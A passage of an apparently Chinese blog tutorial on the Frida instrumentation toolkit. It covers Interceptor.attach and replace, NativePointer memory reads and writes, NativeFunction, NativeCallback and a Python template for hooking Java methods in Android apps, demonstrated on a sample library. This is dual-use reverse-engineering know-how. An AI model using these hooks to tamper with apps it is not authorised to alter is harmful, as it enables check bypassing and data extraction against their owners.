this.fileDescriptor */</span><br>    &#125;<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="通过我们对Interceptor-attach函数有一些基本了解了-它还包含一些属性。"><a href="#通过我们对Interceptor-attach函数有一些基本了解了-它还包含一些属性。" class="headerlink" title="通过我们对Interceptor.attach函数有一些基本了解了~它还包含一些属性。"></a>通过我们对Interceptor.attach函数有一些基本了解了~它还包含一些属性。</h4><table><thead><tr><th>索引</th><th>属性</th><th>含义</th></tr></thead><tbody><tr><td>1</td><td>returnAddress</td><td>返回地址，类型是NativePointer</td></tr><tr><td>2</td><td>context</td><td>上下文：具有键pc和sp的对象，它们是分别为ia32/x64/arm指定EIP/RIP/PC和ESP/RSP/SP的NativePointer对象。其他处理器特定的键也可用，例如eax、rax、r0、x0等。也可以通过分配给这些键来更新寄存器值。</td></tr><tr><td>3</td><td>errno</td><td>当前errno值</td></tr><tr><td>4</td><td>lastError</td><td>当前操作系统错误值</td></tr><tr><td>5</td><td>threadId</td><td>操作系统线程ID</td></tr><tr><td>6</td><td>depth</td><td>相对于其他调用的调用深度</td></tr><tr><td>我们来看看示例代码。</td><td></td><td></td></tr></tbody></table><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">frida_Interceptor</span>(<span class="hljs-params"></span>) </span>&#123;<br>    Java.perform(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-comment">//对So层的导出函数getSum进行拦截</span><br>        Interceptor.attach(Module.findExportByName(<span class="hljs-string">&quot;libhello.so&quot;</span> , <span class="hljs-string">&quot;Java_com_roysue_roysueapplication_hellojni_getSum&quot;</span>), &#123;<br>            <span class="hljs-attr">onEnter</span>: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">args</span>) </span>&#123;<br>                <span class="hljs-comment">//输出</span><br>                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;Context information:&#x27;</span>);<br>                <span class="hljs-comment">//输出上下文因其是一个Objection对象，需要它进行接送、转换才能正常看到值</span><br>                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;Context  : &#x27;</span> + <span class="hljs-built_in">JSON</span>.stringify(<span class="hljs-built_in">this</span>.context));<br>                <span class="hljs-comment">//输出返回地址</span><br>                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;Return   : &#x27;</span> + <span class="hljs-built_in">this</span>.returnAddress);<br>                <span class="hljs-comment">//输出线程id</span><br>                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;ThreadId : &#x27;</span> + <span class="hljs-built_in">this</span>.threadId);<br>                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;Depth    : &#x27;</span> + <span class="hljs-built_in">this</span>.depth);<br>                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;Errornr  : &#x27;</span> + <span class="hljs-built_in">this</span>.err);<br>            &#125;,<br>            <span class="hljs-attr">onLeave</span>:<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">retval</span>)</span>&#123;<br>            &#125;<br>        &#125;);<br>    &#125;);<br>&#125;<br>setImmediate(frida_Interceptor,<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><h4 id="Interceptor-detachAll"><a href="#Interceptor-detachAll" class="headerlink" title="Interceptor.detachAll"></a>Interceptor.detachAll</h4><p>作用就是让之前所有的Interceptor.attach附加拦截的回调函数失效。</p><h4 id="Interceptor-replace"><a href="#Interceptor-replace" class="headerlink" title="Interceptor.replace"></a>Interceptor.replace</h4><p>相当于替换掉原本的函数，用替换时的实现替换目标处的函数。如果想要完全或部分替换现有函数的实现，则通常使用此函数。，我们也看例子，例子是最直观的！代码如下。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">frida_Interceptor</span>(<span class="hljs-params"></span>) </span>&#123;<br>    Java.perform(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>       <span class="hljs-comment">//这个c_getSum方法有两个int参数、返回结果为两个参数相加</span><br>       <span class="hljs-comment">//这里用NativeFunction函数自己定义了一个c_getSum函数</span><br>       <span class="hljs-keyword">var</span> add_method = <span class="hljs-keyword">new</span> NativeFunction(Module.findExportByName(<span class="hljs-string">&#x27;libhello.so&#x27;</span>, <span class="hljs-string">&#x27;c_getSum&#x27;</span>), <br>       <span class="hljs-string">&#x27;int&#x27;</span>,[<span class="hljs-string">&#x27;int&#x27;</span>,<span class="hljs-string">&#x27;int&#x27;</span>]);<br>       <span class="hljs-comment">//输出结果 那结果肯定就是 3</span><br>       <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;result:&quot;</span>,add_method(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>));<br>       <span class="hljs-comment">//这里对原函数的功能进行替换实现</span><br>       Interceptor.replace(add_method, <span class="hljs-keyword">new</span> NativeCallback(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">a, b</span>) </span>&#123;<br>           <span class="hljs-comment">//h不论是什么参数都返回123</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-number">123</span>;<br>       &#125;, <span class="hljs-string">&#x27;int&#x27;</span>, [<span class="hljs-string">&#x27;int&#x27;</span>, <span class="hljs-string">&#x27;int&#x27;</span>]));<br>       <span class="hljs-comment">//再次调用 则返回123</span><br>       <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;result:&quot;</span>,add_method(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>));<br>    &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="NativePointer对象"><a href="#NativePointer对象" class="headerlink" title="NativePointer对象"></a>NativePointer对象</h3><p>同等与C语言中的指针</p><h4 id="new-NativePointer-s"><a href="#new-NativePointer-s" class="headerlink" title="new NativePointer(s)"></a>new NativePointer(s)</h4><p>声明定义NativePointer类型</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">frida_NativePointer</span>(<span class="hljs-params"></span>) </span>&#123;<br>    Java.perform(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-comment">//第一种字符串定义方式 十进制的100 输出为十六进制0x64</span><br>        <span class="hljs-keyword">const</span> ptr1 = <span class="hljs-keyword">new</span> NativePointer(<span class="hljs-string">&quot;100&quot;</span>);<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;ptr1:&quot;</span>,ptr1);<br>        <span class="hljs-comment">//第二种字符串定义方式 直接定义0x64 同等与定义十六进制的64</span><br>        <span class="hljs-keyword">const</span> ptr2 = <span class="hljs-keyword">new</span> NativePointer(<span class="hljs-string">&quot;0x64&quot;</span>);<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;ptr2:&quot;</span>,ptr2);        <br>        <span class="hljs-comment">//第三种定数值义方式 定义数字int类型 十进制的100 是0x64</span><br>        <span class="hljs-keyword">const</span> ptr3 = <span class="hljs-keyword">new</span> NativePointer(<span class="hljs-number">100</span>);<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;ptr3:&quot;</span>,ptr3);<br>    &#125;);<br>&#125;     <br>setImmediate(frida_NativePointer,<span class="hljs-number">0</span>);<br><br>输出如下，都会自动转为十六进制的<span class="hljs-number">0x64</span><br><span class="hljs-attr">ptr1</span>: <span class="hljs-number">0x64</span><br><span class="hljs-attr">ptr2</span>: <span class="hljs-number">0x64</span><br><span class="hljs-attr">ptr3</span>: <span class="hljs-number">0x64</span><br></code></pre></td></tr></table></figure><h4 id="运算符以及指针读写API"><a href="#运算符以及指针读写API" class="headerlink" title="运算符以及指针读写API"></a>运算符以及指针读写API</h4><p>它也能调用以下运算符</p> <img src="/2021/08/25/frida%E6%95%99%E7%A8%8B/images/%E6%8C%87%E9%92%88%E8%AF%BB%E5%86%99API.png" class=""><p>看完API含义之后，我们来使用他们，下面该脚本是readByteArray()示例~</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">frida_NativePointer</span>(<span class="hljs-params"></span>) </span>&#123;<br>    Java.perform(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>       <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;&quot;</span>);<br>        <span class="hljs-comment">//拿到libc.so在内存中的地址</span><br>        <span class="hljs-keyword">var</span> pointer = Process.findModuleByName(<span class="hljs-string">&quot;libc.so&quot;</span>).base;<br>        <span class="hljs-comment">//读取从pointer地址开始的16个字节</span><br>        <span class="hljs-built_in">console</span>.log(pointer.readByteArray(<span class="hljs-number">0x10</span>));<br>    &#125;);<br>&#125;     <br>setImmediate(frida_NativePointer,<span class="hljs-number">0</span>);<br>输出如下：<br>           <span class="hljs-number">0</span>  <span class="hljs-number">1</span>  <span class="hljs-number">2</span>  <span class="hljs-number">3</span>  <span class="hljs-number">4</span>  <span class="hljs-number">5</span>  <span class="hljs-number">6</span>  <span class="hljs-number">7</span>  <span class="hljs-number">8</span>  <span class="hljs-number">9</span>  A  B  C  D  E  F  0123456789ABCDEF<br><span class="hljs-number">00000000</span>  7f <span class="hljs-number">45</span> 4c <span class="hljs-number">46</span> <span class="hljs-number">01</span> <span class="hljs-number">01</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  .ELF............<br></code></pre></td></tr></table></figure><p>首先我先来用readByteArray函数来读取libc.so文件在内存中的数据，这样我们方便测试，我们从libc文件读取0x10个字节的长度，肯定会是7F 45 4C 46…因为ELF文件头部信息中的Magic属性。</p><h4 id="readPointer"><a href="#readPointer" class="headerlink" title="readPointer()"></a>readPointer()</h4><p>从此内存位置读取NativePointer，示例代码如下。省略function以及Java.perform~</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> pointer = Process.findModuleByName(<span class="hljs-string">&quot;libc.so&quot;</span>).base;<br>    <span class="hljs-built_in">console</span>.log(pointer.readByteArray(<span class="hljs-number">0x10</span>));<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;readPointer():&quot;</span>+pointer.readPointer());<br>    输出如下。<br>    readPointer():<span class="hljs-number">0x464c457f</span><br></code></pre></td></tr></table></figure><p>也就是将readPointer的前四个字节的内容转成地址产生一个新的NativePointer。</p><h4 id="writePointer-ptr"><a href="#writePointer-ptr" class="headerlink" title="writePointer(ptr)"></a>writePointer(ptr)</h4><p>读取ptr指针地址到当前指针</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs js">     <span class="hljs-comment">//先打印pointer指针地址</span><br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;pointer :&quot;</span>+pointer);<br>        <span class="hljs-comment">//分配四个字节的空间地址</span><br>        <span class="hljs-keyword">const</span> r = Memory.alloc(<span class="hljs-number">4</span>);<br>        <span class="hljs-comment">//将pointer指针写入刚刚申请的r内</span><br>        r.writePointer(pointer);<br>        <span class="hljs-comment">//读取r指针的数据</span><br>        <span class="hljs-keyword">var</span> buffer = Memory.readByteArray(r, <span class="hljs-number">4</span>);<br>        <span class="hljs-comment">//r指针内放的pointer指针地址</span><br>        <span class="hljs-built_in">console</span>.log(buffer);<br>        <br>        输出如下。<br><span class="hljs-comment">//console.log(&quot;pointer :&quot;+pointer); 这句打印的地址 也就是libc的地址</span><br><span class="hljs-attr">pointer</span> :<span class="hljs-number">0xf588f000</span><br><span class="hljs-comment">//console.log(buffer); 输出buffer 0xf588f000在内存数据会以00 f0 88 f5方式显示</span><br>           <span class="hljs-number">0</span>  <span class="hljs-number">1</span>  <span class="hljs-number">2</span>  <span class="hljs-number">3</span>  <span class="hljs-number">4</span>  <span class="hljs-number">5</span>  <span class="hljs-number">6</span>  <span class="hljs-number">7</span>  <span class="hljs-number">8</span>  <span class="hljs-number">9</span>  A  B  C  D  E  F  0123456789ABCDEF<br><span class="hljs-number">00000000</span>  <span class="hljs-number">00</span> f0 <span class="hljs-number">88</span> f5                                      ....<br></code></pre></td></tr></table></figure><h4 id="readS32-、readU32"><a href="#readS32-、readU32" class="headerlink" title="readS32()、readU32()"></a>readS32()、readU32()</h4><p>从该内存位置读取有符号或无符号8/16/32/etc或浮点数/双精度值，并将其作为数字返回。这里拿readS32()、readU32()作为演示.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js">   <span class="hljs-comment">//从pointer地址读4个字节 有符号</span><br>    <span class="hljs-built_in">console</span>.log(pointer.readS32());<br>    <span class="hljs-comment">//从pointer地址读4个字节 无符号</span><br>    <span class="hljs-built_in">console</span>.log(pointer.readU32());<br><br><br>输出如下。<br>           <span class="hljs-number">0</span>  <span class="hljs-number">1</span>  <span class="hljs-number">2</span>  <span class="hljs-number">3</span>  <span class="hljs-number">4</span>  <span class="hljs-number">5</span>  <span class="hljs-number">6</span>  <span class="hljs-number">7</span>  <span class="hljs-number">8</span>  <span class="hljs-number">9</span>  A  B  C  D  E  F  0123456789ABCDEF<br><span class="hljs-number">00000000</span>  7f <span class="hljs-number">45</span> 4c <span class="hljs-number">46</span> <span class="hljs-number">01</span> <span class="hljs-number">01</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  .ELF............<br><span class="hljs-number">1179403647</span> == <span class="hljs-number">0x464c457f</span><br><span class="hljs-number">1179403647</span> == <span class="hljs-number">0x464c457f</span><br></code></pre></td></tr></table></figure><h4 id="writeS32-、writeU32"><a href="#writeS32-、writeU32" class="headerlink" title="writeS32()、writeU32()"></a>writeS32()、writeU32()</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js">    <span class="hljs-comment">//申请四个字节的内存空间</span><br>    <span class="hljs-keyword">const</span> r = Memory.alloc(<span class="hljs-number">4</span>);<br>    <span class="hljs-comment">//将0x12345678写入r地址中</span><br>    r.writeS32(<span class="hljs-number">0x12345678</span>);<br>    <span class="hljs-comment">//输出</span><br>    <span class="hljs-built_in">console</span>.log(r.readByteArray(<span class="hljs-number">0x10</span>));<br><span class="hljs-comment">// writeS32()、writeU32()输出的也是一样的，只是区别是有符号和无符号</span><br>输出如下。<br>           <span class="hljs-number">0</span>  <span class="hljs-number">1</span>  <span class="hljs-number">2</span>  <span class="hljs-number">3</span>  <span class="hljs-number">4</span>  <span class="hljs-number">5</span>  <span class="hljs-number">6</span>  <span class="hljs-number">7</span>  <span class="hljs-number">8</span>  <span class="hljs-number">9</span>  A  B  C  D  E  F  0123456789ABCDEF<br><span class="hljs-number">00000000</span>  <span class="hljs-number">78</span> <span class="hljs-number">56</span> <span class="hljs-number">34</span> <span class="hljs-number">12</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  xV4.............<br></code></pre></td></tr></table></figure><h4 id="readByteArray-length-、writeByteArray-bytes"><a href="#readByteArray-length-、writeByteArray-bytes" class="headerlink" title="readByteArray(length))、writeByteArray(bytes)"></a>readByteArray(length))、writeByteArray(bytes)</h4><p>readByteArray(length))连续读取内存length个字节，、writeByteArray连续写入内存bytes。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs js">    <span class="hljs-comment">//先定义一个需要写入的字节数组</span><br>       <span class="hljs-keyword">var</span> arr = [ <span class="hljs-number">0x72</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x65</span>];<br>       <span class="hljs-comment">//这里申请以arr大小的内存空间</span><br>       <span class="hljs-keyword">const</span> r = Memory.alloc(arr.length);<br>       <span class="hljs-comment">//将arr数组字节写入r</span><br>       Memory.writeByteArray(r,arr);<br>       <span class="hljs-comment">//读取arr.length大小的数组</span><br>       <span class="hljs-keyword">var</span> buffer = Memory.readByteArray(r, arr.length);<br>       <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;Memory.readByteArray:&quot;</span>);<br>       <span class="hljs-built_in">console</span>.log(hexdump(buffer, &#123;<br>            <span class="hljs-attr">offset</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-attr">length</span>: arr.length,<br>            <span class="hljs-attr">header</span>: <span class="hljs-literal">true</span>,<br>            <span class="hljs-attr">ansi</span>: <span class="hljs-literal">false</span><br>        &#125;));<br><br>输出如下。       <br>Memory.readByteArray:<br>           <span class="hljs-number">0</span>  <span class="hljs-number">1</span>  <span class="hljs-number">2</span>  <span class="hljs-number">3</span>  <span class="hljs-number">4</span>  <span class="hljs-number">5</span>  <span class="hljs-number">6</span>  <span class="hljs-number">7</span>  <span class="hljs-number">8</span>  <span class="hljs-number">9</span>  A  B  C  D  E  F  0123456789ABCDEF<br><span class="hljs-number">00000000</span>  <span class="hljs-number">72</span> 6f <span class="hljs-number">79</span> <span class="hljs-number">73</span> <span class="hljs-number">75</span> <span class="hljs-number">65</span>                                roysue<br></code></pre></td></tr></table></figure><h4 id="readCString-size-1-、writeUtf8String-str"><a href="#readCString-size-1-、writeUtf8String-str" class="headerlink" title="readCString([size = -1])、writeUtf8String(str)"></a>readCString([size = -1])、writeUtf8String(str)</h4><p>readCString功能是读取指针地址位置的字节字符串，对应的writeUtf8String是写入指针地址位置的字符串处。（这里的r是接着上面的代码的变量）。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//在这里直接使用readCString读取会把上面的&#x27;roysue&#x27;字符串读取出来</span><br>       <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;readCString():&quot;</span>+r.readCString());<br>       <span class="hljs-comment">//这里是写入字符串 也就是 roysue起始位置开始被替换为haha</span><br>       <span class="hljs-keyword">const</span> newPtrstr = r.writeUtf8String(<span class="hljs-string">&quot;haha&quot;</span>);<br>       <span class="hljs-comment">//替换完了之后再继续输出 必然是haha</span><br>       <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;readCString():&quot;</span>+newPtrstr.readCString());<br></code></pre></td></tr></table></figure><h3 id="NativeFunction对象"><a href="#NativeFunction对象" class="headerlink" title="NativeFunction对象"></a>NativeFunction对象</h3><p>创建新的NativeFunction以调用address处的函数(用NativePointer指定)，其中rereturn Type指定返回类型，argTypes数组指定参数类型。如果不是系统默认值，还可以选择指定ABI。对于可变函数，添加一个‘.’固定参数和可变参数之间的argTypes条目，我们来看看官方的例子。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// LargeObject HandyClass::friendlyFunctionName();</span><br><span class="hljs-comment">//创建friendlyFunctionPtr地址的函数</span><br><span class="hljs-keyword">var</span> friendlyFunctionName = <span class="hljs-keyword">new</span> NativeFunction(friendlyFunctionPtr,<br>    <span class="hljs-string">&#x27;void&#x27;</span>, [<span class="hljs-string">&#x27;pointer&#x27;</span>, <span class="hljs-string">&#x27;pointer&#x27;</span>]);<br><span class="hljs-comment">//申请内存空间    </span><br><span class="hljs-keyword">var</span> returnValue = Memory.alloc(sizeOfLargeObject);<br><span class="hljs-comment">//调用friendlyFunctionName函数</span><br>friendlyFunctionName(returnValue, thisPtr);<br></code></pre></td></tr></table></figure><p>我来看看它的格式，函数定义格式为new NativeFunction(address, returnType, argTypes[, options])，参照这个格式能够创建函数并且调用！returnType和argTypes[，]分别可以填void、pointer、int、uint、long、ulong、char、uchar、float、double、int8、uint8、int16、uint16、int32、uint32、int64、uint64这些类型，根据函数的所需要的type来定义即可。</p><p>在定义的时候必须要将参数类型个数和参数类型以及返回值完全匹配，假设有三个参数都是int，则new NativeFunction(address, returnType, [‘int’, ‘int’, ‘int’])，而返回值是int则new NativeFunction(address, ‘int’, argTypes[, options])，必须要全部匹配，并且第一个参数一定要是函数地址指针。</p><h3 id="NativeCallback对象"><a href="#NativeCallback对象" class="headerlink" title="NativeCallback对象"></a>NativeCallback对象</h3><p>new NativeCallback(func，rereturn Type，argTypes[，ABI])：创建一个由JavaScript函数func实现的新NativeCallback，其中rereturn Type指定返回类型，argTypes数组指定参数类型。</p><p>您还可以指定ABI(如果不是系统默认值)。</p><p>有关支持的类型和Abis的详细信息，请参见NativeFunction。注意，返回的对象也是一个NativePointer，因此可以传递给Interceptor#replace。当将产生的回调与Interceptor.replace()一起使用时，将调用func，并将其绑定到具有一些有用属性的对象，就像Interceptor.Attach()中的那样。我们来看一个例子。如下，利用NativeCallback做一个函数替换。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js">Java.perform(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> add_method = <span class="hljs-keyword">new</span> NativeFunction(Module.findExportByName(<span class="hljs-string">&#x27;libhello.so&#x27;</span>, <span class="hljs-string">&#x27;c_getSum&#x27;</span>), <br>    <span class="hljs-string">&#x27;int&#x27;</span>,[<span class="hljs-string">&#x27;int&#x27;</span>,<span class="hljs-string">&#x27;int&#x27;</span>]);<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;result:&quot;</span>,add_method(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>));<br>    <span class="hljs-comment">//在这里new一个新的函数，但是参数的个数和返回值必须对应</span><br>    Interceptor.replace(add_method, <span class="hljs-keyword">new</span> NativeCallback(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">a, b</span>) </span>&#123;<br>         <span class="hljs-keyword">return</span> <span class="hljs-number">123</span>;<br>    &#125;, <span class="hljs-string">&#x27;int&#x27;</span>, [<span class="hljs-string">&#x27;int&#x27;</span>, <span class="hljs-string">&#x27;int&#x27;</span>]));<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;result:&quot;</span>,add_method(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>));<br> &#125;);<br></code></pre></td></tr></table></figure><h2 id="HOOK"><a href="#HOOK" class="headerlink" title="HOOK"></a>HOOK</h2><h3 id="HOOK-java层方法模版"><a href="#HOOK-java层方法模版" class="headerlink" title="HOOK java层方法模版"></a>HOOK java层方法模版</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> frida, sys<br><br><span class="hljs-comment">#接收js脚本send方法传入的数据</span><br><span class="hljs-comment">#@message数据类型为字典</span><br><span class="hljs-comment">#&#123;&#x27;type&#x27;:&#x27;send&#x27;,&#x27;payload&#x27;:&#x27;js脚本发送的数据&#x27;&#125;</span><br><span class="hljs-comment">#@data数据类型为byte</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">on_message</span>(<span class="hljs-params">message, data</span>):</span><br>    <span class="hljs-keyword">if</span> message[<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;send&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] &#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(message[<span class="hljs-string">&#x27;payload&#x27;</span>]))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(message)<br><br>jscode = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string">Java.perform(function () &#123;</span><br><span class="hljs-string">  var MainActivity = Java.use(&#x27;类名&#x27;);</span><br><span class="hljs-string">  MainActivity.方法.implementation = function (入参) &#123;</span><br><span class="hljs-string">    //打印入参数据</span><br><span class="hljs-string">console.log(入参)</span><br><span class="hljs-string">    var result=this.方法(入参)</span><br><span class="hljs-string">    //打印出参</span><br><span class="hljs-string">console.log(出参)</span><br><span class="hljs-string">    //数据返回</span><br><span class="hljs-string">    return result</span><br><span class="hljs-string">  &#125;;</span><br><span class="hljs-string">&#125;);</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-comment">#重启应用并附加到运行中的应用的进程中</span><br><span class="hljs-comment">#pid=frida.get_usb_device().spawn([&#x27;包名&#x27;])</span><br><span class="hljs-comment">#process = frida.get_usb_device().attach(pid)</span><br><br><span class="hljs-comment">#附加到运行中的应用的进程中</span><br>process = frida.get_usb_device().attach(<span 